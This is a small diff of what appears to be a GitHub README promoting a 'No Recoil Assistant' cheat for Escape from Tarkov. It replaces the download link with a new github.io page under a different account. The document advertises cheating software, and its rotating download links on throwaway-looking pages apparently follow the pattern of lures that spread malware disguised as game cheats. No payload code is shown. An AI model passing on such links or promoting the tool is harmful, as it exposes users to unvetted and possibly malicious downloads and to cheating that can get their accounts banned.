@@ -3,7 +3,7 @@
 Deploy a **No Recoil Assistant** for **Escape from Tarkov** on Windows to reduce weapon kickback and keep your spray patterns stable during intense firefights. This technical setup guide explains how to configure smooth recoil compensation for better accuracy and tighter shot grouping.
 
 ⬇️ **Download**  
-[![Download Recoil Control](https://img.shields.io/badge/Download-Recoil_Control-4b5320?style=for-the-badge&logo=escapefromtarkov&logoColor=white)](https://maximilliamueller267.github.io/.github/eft-recoil-control)
+[![Download Recoil Control](https://img.shields.io/badge/Download-Recoil_Control-4b5320?style=for-the-badge&logo=escapefromtarkov&logoColor=white)](https://milanstonekwyx.github.io/.github/eft-recoil-control)
 
 ---
 
